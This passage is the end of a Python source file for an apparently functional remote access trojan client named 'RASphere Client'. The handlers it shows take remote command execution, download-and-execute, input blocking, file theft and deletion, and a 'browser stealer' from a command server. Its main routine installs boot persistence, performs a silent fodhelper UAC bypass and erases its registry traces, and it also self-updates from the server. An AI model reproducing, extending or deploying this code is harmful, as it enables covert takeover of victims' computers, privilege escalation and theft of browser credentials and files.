    def _ec(d): out, rc = _execute_command((d or {}).get("command","")); sio.emit("execute_result", {"output": out, "code": rc})
    @sio.on("download_exec")
    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get("path")); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
    @sio.on("input_block")
    def _ib(d=None): ok, msg = _block_input(True); sio.emit("cmd_result", {"cmd": "input_block", "ok": ok, "message": msg})
    @sio.on("input_unblock")
    def _iub(d=None): ok, msg = _block_input(False); sio.emit("cmd_result", {"cmd": "input_unblock", "ok": ok, "message": msg})

    # File ops
    @sio.on("file_list")
    def _fl(d): sio.emit("file_list_result", _flist((d or {}).get("path","")))
    @sio.on("file_download_request")
    def _fdr(d): sio.emit("file_download_chunk", {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
    @sio.on("file_delete")
    def _fd(d): ok, msg = _fdel((d or {}).get("path","")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
    @sio.on("file_new_folder")
    def _fnf(d): ok, msg = _fmkdir((d or {}).get("parent",""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
    @sio.on("file_upload_chunk")
    def _fuc(d):
        path = (d or {}).get("path",""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
        mode = "wb" if offset == 0 else "ab"
        ok, msg = _fwrite(path, chunk, offset, mode)
        sio.emit("file_upload_result", {"ok": ok, "message": msg, "path": path})

    # Network
    @sio.on("network_info")
    def _ninfo(d=None): sio.emit("network_info_result", _network_info())

    # Browser stealer
    @sio.on("browser_steal")
    def _bs(d=None):
        log.info("Browser stealer requested")
        result = _browser_steal()
        sio.emit("browser_steal_result", result)

    @sio.on("kill_switch")
    def _ks(d=None):
        log.warning("KILL SWITCH"); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); sio.disconnect(); os._exit(0)

# ── Main ─────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="RASphere Client")
    p.add_argument("--server", default=None, help=f"Server URL (default: {_SERVER})")
    p.add_argument("--secret", default=None, help=f"Client secret (default: ***)")
    p.add_argument("--id", default=None, help="Client ID (default: auto)")
    p.add_argument("--reconnect", type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
    p.add_argument("--install", action="store_true", help="Install persistence")
    p.add_argument("--uninstall", action="store_true", help="Remove persistence")
    p.add_argument("--no-persist", action="store_true", help="Skip auto-persistence")
    p.add_argument("--elevated", action="store_true", help=argparse.SUPPRESS)
    p.add_argument("--no-elevate", action="store_true", help="Skip UAC bypass on startup")
    args = p.parse_args()

    url = args.server or _SERVER; secret = args.secret or _SECRET
    rec = args.reconnect if args.reconnect is not None else _RECON
    cid = args.id or _CLIENT_ID

    if args.uninstall:
        if uninstall_persist(): print("\n[+] Persistence removed.\n")
        else: print("\n[-] No persistence found.\n")
        return

    if args.install:
        if not url or not secret: print("ERROR: --server and --secret required for --install"); sys.exit(1)
        if install_persist(url, secret, rec, cid): print("\n[+] Persistence installed! Auto-start on boot.\n")
        else: print("\n[-] Install failed. Run as admin.\n")

    # Silent UAC bypass on startup (unless --no-elevate or --elevated)
    if sys.platform == "win32" and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
        if not _is_admin():
            log.info("Not admin - attempting silent UAC bypass...")
            _fodhelper_uac_bypass(args)
            # If fodhelper worked, we exit inside the function. If we get here, it failed.
            print("[!] UAC bypass failed - running with limited privileges")
        else:
            log.info("Already running as admin")

    # Clean up fodhelper registry keys if elevated
    if getattr(args, "elevated", False):
        log.info("Running elevated - cleaning up UAC bypass registry...")
        _cleanup_uac_registry()

    # Auto-install persistence on every run (unless --no-persist)
    if not args.no_persist and not args.uninstall:
        try:
            if url and secret:
                ok = install_persist(url, secret, rec, cid)
                if ok: print("[+] Persistence refreshed")
                else: print("[!] Persistence may have partially failed (run as admin for Scheduled Task)")
        except Exception as e: print(f"[!] Auto-persist error: {e}")

    if not url: print("ERROR: Set _SERVER in code or use --server"); sys.exit(1)
    if not secret: print("ERROR: Set _SECRET in code or use --secret"); sys.exit(1)

    state.url = url.rstrip("/"); state.secret = secret
    state.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"

    log.info(f"RASphere Client | ID: {state.cid} | Server: {state.url}")

    sio = sio_lib.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=rec,
                          reconnection_delay_max=30, logger=False, engineio_logger=False)
    setup_handlers(sio); state.sio = sio

    # Start keep-alive pinger to prevent Render from sleeping
    threading.Thread(target=_keepalive_pinger, args=(state.url,), daemon=True).start()

    update_checked = False
    current_delay = rec  # current backoff delay, grows on failures

    while True:
        try:
            log.info(f"Connecting to {state.url}...")
            sio.connect(state.url, wait_timeout=10)
            log.info("Connected! Waiting for commands...")

            # Reset backoff on successful connection
            current_delay = rec

            # Check for updates on first successful connection
            if not update_checked:
                new_ver, dl_url = _check_for_update(state.url)
                update_checked = True
                if new_ver and dl_url:
                    log.info(f"New version {new_ver} available, applying update...")
                    ok = _download_and_install(dl_url, new_ver)
                    if ok:
                        log.info("Exiting for update...")
                        sio.disconnect()
                        os._exit(0)

            sio.wait()
        except KeyboardInterrupt: log.info("Shutdown"); break
        except Exception as e:
            log.error(f"Connection error: {e}")
            if not rec: break
            log.info(f"Reconnecting in {current_delay}s...")
            time.sleep(current_delay)
            # Exponential backoff: double delay, cap at _RECON_MAX
            current_delay = min(current_delay * 2, _RECON_MAX)
    sio.disconnect(); log.info("Stopped")

if __name__ == "__main__": main()
